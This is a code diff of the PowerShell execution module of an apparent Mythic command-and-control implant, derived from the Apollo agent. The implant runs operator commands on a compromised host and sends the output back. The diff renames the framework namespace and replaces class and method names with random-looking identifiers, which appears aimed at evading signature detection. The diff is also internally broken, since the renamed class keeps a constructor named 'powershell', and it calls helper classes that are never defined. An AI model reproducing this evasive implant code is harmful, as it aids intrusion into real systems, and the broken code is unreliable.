@@ -6,7 +6,7 @@
 
 #if POWERSHELL
 
-using ApolloInterop.Classes.IO;
+using PhantomInterop.Classes.IO;
 using System;
 using System.Collections.Generic;
 using System.Globalization;
@@ -14,18 +14,18 @@ using System.IO;
 using System.Management.Automation;
 using System.Management.Automation.Host;
 using System.Threading;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using ST = System.Threading.Tasks;
 using System.Management.Automation.Runspaces;
 using System.Collections.Concurrent;
 using System.Runtime.Serialization;
-using ApolloInterop.Classes.Collections;
+using PhantomInterop.Classes.Collections;
 
 namespace Tasks
 {
-    public class powershell : Tasking
+    public class DynamicManager6AB4 : Tasking
     {
         class CustomPowerShellHost : PSHost
         {
@@ -311,13 +311,13 @@ namespace Tasks
         private Action _flushMessages;
 
         [DataContract]
-        internal struct PowerShellParameters
+        internal struct SpectreControllerB4D0
         {
             [DataMember(Name = "command")] public string Command;
         }
         
         
-        public powershell(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public powershell(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _flushMessages = () =>
             {
@@ -329,8 +329,8 @@ namespace Tasks
                         _completed,
                         _cancellationToken.Token.WaitHandle
                     }, 1000);
-                    output = string.Join("", _psOutput.Flush());
-                    if (!string.IsNullOrEmpty(output))
+                    output = StringProcessor.CombineElements("", _psOutput.Flush());
+                    if (!ValidationHelper.IsStringEmpty(output))
                     {
                         _agent.GetTaskManager().AddTaskResponseToQueue(
                             CreateTaskResponse(
@@ -339,8 +339,8 @@ namespace Tasks
                                 ""));
                     }
                 }
-                output = string.Join("", _psOutput.Flush());
-                if (!string.IsNullOrEmpty(output))
+                output = StringProcessor.CombineElements("", _psOutput.Flush());
+                if (!ValidationHelper.IsStringEmpty(output))
                 {
                     _agent.GetTaskManager().AddTaskResponseToQueue(
                         CreateTaskResponse(
@@ -358,7 +358,7 @@ namespace Tasks
             MythicTaskResponse resp;
             string cmd = "";
             var loadedScript = _agent.GetFileManager().GetScript();
-            if (!string.IsNullOrEmpty(loadedScript))
+            if (!ValidationHelper.IsStringEmpty(loadedScript))
             {
                 cmd += loadedScript;
             }
@@ -427,7 +427,7 @@ namespace Tasks
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
-        private void OnBufferWrite(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
+        private void RobustEngine12EA(object sender, PhantomInterop.Classes.Events.StringDataEventArgs e)
         {
             if(e.Data != null)
             {
